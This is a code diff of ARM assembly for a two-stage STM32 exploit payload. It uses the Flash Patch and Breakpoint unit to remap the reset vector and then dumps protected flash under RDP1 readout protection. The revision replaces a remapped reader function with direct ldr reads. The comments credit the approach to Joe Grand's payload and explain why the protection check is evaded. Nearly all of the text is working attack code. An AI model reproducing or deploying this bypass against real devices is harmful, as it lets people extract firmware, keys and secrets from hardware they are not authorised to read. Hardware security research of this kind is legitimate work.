@@ -55,13 +55,13 @@ stage1_start:
     ldr r1, =0x20000020
     str r0, [r1]
 
-    /* Write FPB reader function to remap slot 1 (0x20000024):
-     * ldr r0,[r0] = 0x6800, bx lr = 0x4770 -> combined LE word 0x47706800 */
-    ldr r0, =0x47706800
-    ldr r1, =0x20000024
-    str r0, [r1]
-
-    /* Configure FPB */
+    /* Configure FPB — COMP0 reset-vector remap ONLY (matches Joe Grand's
+     * proven stm32-payload: only FP_CTRL/FP_REMAP/FP_COMP0 are set). The reader
+     * trick (FP_COMP1 + blx to a flash address) is unnecessary and — with an
+     * enabled flash-address comparator live during the RDP1 flash-boot — appears
+     * to break the launch (no stage-2 header at RDP1). Once stage 2 is entered
+     * via the reset-vector remap after a FLASH boot, the MCU "thinks it is
+     * executing from flash", so a DIRECT ldr is permitted even under RDP1. */
     ldr r0, =0xE0002000    /* FPB base */
     movs r1, #3            /* FP_CTRL: ENABLE + KEY */
     str r1, [r0, #0]
@@ -69,7 +69,7 @@ stage1_start:
     str r1, [r0, #4]
     movs r1, #0x05         /* FP_COMP0: ENABLE + match addr 0x04 (reset vector) */
     str r1, [r0, #8]
-    ldr r1, =0x08000101    /* FP_COMP1: ENABLE + match addr 0x08000100 (reader) */
+    movs r1, #0            /* FP_COMP1: DISABLED (no reader trick) */
     str r1, [r0, #0x0C]
 
     /* Infinite loop — wait for host to switch BOOT0 and pulse nRST */
@@ -140,13 +140,13 @@ stage2_start:
     ldr r3, [r5]
     bl send_word
 
-    /* Dump flash via FPB reader at 0x08000101 (thumb). PC lands in flash
-     * range so the flash controller permits the read under RDP1. */
+    /* Dump flash via DIRECT read (matches Joe Grand's payload, which reads with a
+     * plain pointer deref). Because stage 2 was entered via the FPB reset-vector
+     * remap after a FLASH boot, the MCU "thinks it is executing from flash", so
+     * the flash controller permits a plain ldr even under RDP1 — no reader trick. */
     ldr r5, =0x08000000    /* Flash address to read */
-    ldr r6, =0x08000101    /* FPB reader function (thumb) */
 dump_loop:
-    mov r0, r5
-    blx r6                 /* r0 = *(uint32_t*)r0 */
+    ldr r0, [r5]           /* direct read */
     mov r3, r0
     bl send_word
     adds r5, #4
